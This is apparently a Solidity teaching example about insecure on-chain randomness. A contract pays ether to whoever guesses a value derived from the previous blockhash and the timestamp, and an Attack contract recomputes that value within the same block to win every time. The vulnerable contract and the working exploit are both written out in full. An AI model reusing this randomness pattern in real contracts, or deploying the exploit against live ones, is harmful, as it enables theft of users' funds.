// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GuessTheRandomNumber {

    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(
                blockhash(block.number - 1),
                block.timestamp
            )));

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value:1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {

    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(keccak256(abi.encodePacked(
                blockhash(block.number - 1),
                block.timestamp
            )));
        guessTheRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}